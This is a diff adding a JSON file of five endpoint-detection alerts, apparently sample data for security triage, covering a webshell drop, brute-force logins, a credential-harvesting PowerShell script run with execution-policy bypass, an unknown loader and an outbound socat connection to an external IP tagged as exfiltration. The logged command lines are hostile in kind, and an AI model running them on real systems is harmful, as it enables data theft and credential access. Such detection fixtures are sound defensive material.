@@ -1,0 +1,145 @@
+[
+  {
+    "@timestamp": "2025-09-23T22:14:55Z",
+    "host": {
+      "name": "db-prod-01",
+      "business_process": "Core Payment Service"
+    },
+    "rule": {
+      "name": "Suspicious Program Launch - socat",
+      "level": "critical"
+    },
+    "process": {
+      "name": "socat",
+      "command_line": "socat TCP4:185.125.190.59:443 -"
+    },
+    "event": {
+      "action": "process_start",
+      "severity": 4
+    },
+    "network": {
+      "direction": "outbound",
+      "destination_ip": "185.125.190.59",
+      "transport": "tcp"
+    },
+    "tags": [
+      "edr",
+      "endpoint",
+      "lateral",
+      "data_exfil"
+    ]
+  },
+  {
+    "@timestamp": "2025-09-23T21:59:12Z",
+    "host": {
+      "name": "web-edge-02",
+      "business_process": "Digital Banking Portal"
+    },
+    "rule": {
+      "name": "Webshell Dropped",
+      "level": "high"
+    },
+    "process": {
+      "name": "apache2",
+      "command_line": "/usr/sbin/apache2 -k start"
+    },
+    "event": {
+      "action": "file_create",
+      "severity": 3
+    },
+    "network": {
+      "direction": "inbound",
+      "source_ip": "103.21.244.18",
+      "transport": "http"
+    },
+    "tags": [
+      "edr",
+      "web",
+      "initial_access"
+    ]
+  },
+  {
+    "@timestamp": "2025-09-23T22:05:31Z",
+    "host": {
+      "name": "sap-app-01",
+      "business_process": "ERP Finance"
+    },
+    "rule": {
+      "name": "PowerShell Credential Hunt",
+      "level": "critical"
+    },
+    "process": {
+      "name": "pwsh.exe",
+      "command_line": "pwsh.exe -ExecutionPolicy Bypass -File harvest.ps1"
+    },
+    "event": {
+      "action": "script_execution",
+      "severity": 4
+    },
+    "network": {
+      "direction": "internal",
+      "destination_ip": "10.15.22.40",
+      "transport": "tcp"
+    },
+    "tags": [
+      "edr",
+      "credential_access"
+    ]
+  },
+  {
+    "@timestamp": "2025-09-23T22:02:04Z",
+    "host": {
+      "name": "citrix-gw-01",
+      "business_process": "Remote Workforce Access"
+    },
+    "rule": {
+      "name": "Multiple Failed Logins Followed by Success",
+      "level": "high"
+    },
+    "process": {
+      "name": "logonui.exe",
+      "command_line": "logonui.exe /connect"
+    },
+    "event": {
+      "action": "authentication_bruteforce",
+      "severity": 3
+    },
+    "network": {
+      "direction": "inbound",
+      "source_ip": "185.244.25.188",
+      "transport": "tls"
+    },
+    "tags": [
+      "edr",
+      "bruteforce"
+    ]
+  },
+  {
+    "@timestamp": "2025-09-23T21:50:17Z",
+    "host": {
+      "name": "ml-research-03",
+      "business_process": "AI Research Platform"
+    },
+    "rule": {
+      "name": "Unknown Binary Execution",
+      "level": "medium"
+    },
+    "process": {
+      "name": "custom_loader",
+      "command_line": "/tmp/custom_loader --payload model.bin"
+    },
+    "event": {
+      "action": "process_start",
+      "severity": 2
+    },
+    "network": {
+      "direction": "internal",
+      "destination_ip": "10.55.10.99",
+      "transport": "tcp"
+    },
+    "tags": [
+      "edr",
+      "anomaly"
+    ]
+  }
+]
